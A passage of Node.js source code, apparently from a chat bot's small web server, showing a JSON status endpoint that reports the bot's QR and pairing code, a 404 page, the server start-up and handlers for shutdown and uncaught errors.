            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
        });
        res.end(JSON.stringify({ 
            status: botStatus,
            hasQR: !!latestQR,
            qr: latestQR,
            pairingCode: pairingCode,
            prefix: global.BOT_PREFIX,
            timestamp: new Date().toISOString(),
            uptime: process.uptime()
        }));
    }
    
    else {
        res.writeHead(404, { 'Content-Type': 'text/html' });
        res.end(`<center><h1>404 - Page Not Found</h1><a href="/">🏠 Go Home</a></center>`);
    }
});

server.listen(PORT, () => {
    console.log(`🌐 Web server running at http://localhost:${PORT}`);
    console.log(`📁 Session folder: ${path.resolve(AUTH_FOLDER)}`);
    loadPrefix();
});

process.on('SIGINT', () => {
    console.log('\n👋 Shutting down gracefully...');
    
    if (presenceInterval) clearInterval(presenceInterval);

    if (sock) sock.end();

    process.exit(0);
});

process.on('uncaughtException', (err) => {
    console.error('⚠️ Uncaught Exception:', err);
});

process.on('unhandledRejection', (reason) => {
    console.error('⚠️ Unhandled Rejection:', reason);
});
